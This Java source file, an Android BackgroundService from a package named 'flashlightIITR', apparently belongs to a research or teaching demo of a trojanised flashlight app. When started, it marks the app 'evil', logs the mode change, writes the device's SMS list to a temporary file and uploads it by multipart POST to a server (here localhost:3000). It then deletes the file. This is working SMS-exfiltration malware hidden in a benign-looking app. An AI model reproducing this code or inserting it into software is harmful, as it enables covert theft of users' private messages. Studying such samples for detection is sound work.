package com.example.flashlightIITR;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import static android.content.ContentValues.TAG;
import static java.io.File.createTempFile;

public class BackgroundService extends Service {

    private boolean isRunning;
    HashMap<String,String>  smsList = new HashMap<String,String>();
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Context context = this;
        this.isRunning = false;

    }

    private final Runnable myTask = () -> {
        try {

            new ForegroundCheckTask().execute();
            Log.e(TAG, "fromService");
            stopSelf();
        } catch (Exception ex) {
            Log.e(TAG, ex.toString());
        }
    };

    @Override
    public void onDestroy() {
        this.isRunning = false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onStartCommand()","Malicious");
        Log.d("Bg","Starting the malicious activity");

        if(!this.isRunning) {
            this.isRunning = true;

            smsList = (HashMap<String,String>) intent.getExtras().get("SMS_LIST");
            Log.d("Bg","Receive the data");
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(myTask);
        }
        return START_STICKY;
    }


    class ForegroundCheckTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... voids) {

            write_sms();
            Log.d("Bg","Starting the Write sms method.");
            return null;
        }

        private void write_sms() {
            File tempFile = null;
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                // Create a temporary file to store the data
                tempFile = createTempFile("sms_temp", ".txt", getCacheDir());
                FileWriter fileWriter = new FileWriter(tempFile);

                // Add your parameters
                for (Map.Entry<String, String> entry :  smsList.entrySet()) {
                    fileWriter.append(entry.getKey()).append(" : ").append(entry.getValue()).append("\n");
                }

                // Close the FileWriter
                fileWriter.close();

                // Create the connection
                URL url = new URL("http://localhost:3000");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();

                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setDoInput(true);
                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(connection.getOutputStream());

                // Add the file
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + tempFile.getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                BufferedReader bufferedReader = new BufferedReader(new FileReader(tempFile));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    dos.writeBytes(line);
                }
                bufferedReader.close();

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                // Close the streams
                dos.flush();
                dos.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d("Bg", "Response code is 200.");
                } else {
                    Log.e("error", "Got error - Response code: " + responseCode);
                }

                // Disconnect the connection
                connection.disconnect();

                // Delete the temporary file after uploading
                boolean fileDeleted = tempFile.delete();
                if (fileDeleted) {
                    Log.d("Bg", "Temporary file deleted successfully.");
                } else {
                    Log.e("error", "Failed to delete the temporary file.");
                }

            } catch (Exception ex) {
                Log.e("error", ex.toString());
            } finally {
                // Ensuring the file is deleted even in case of exceptions
                if (tempFile != null && tempFile.exists()) {
                    boolean fileDeleted = tempFile.delete();
                    if (fileDeleted) {
                        Log.d("Bg", "Temporary file deleted in finally block.");
                    } else {
                        Log.e("error", "Failed to delete the temporary file in finally block.");
                    }
                }
                stopSelf();
            }
        }
    }
}
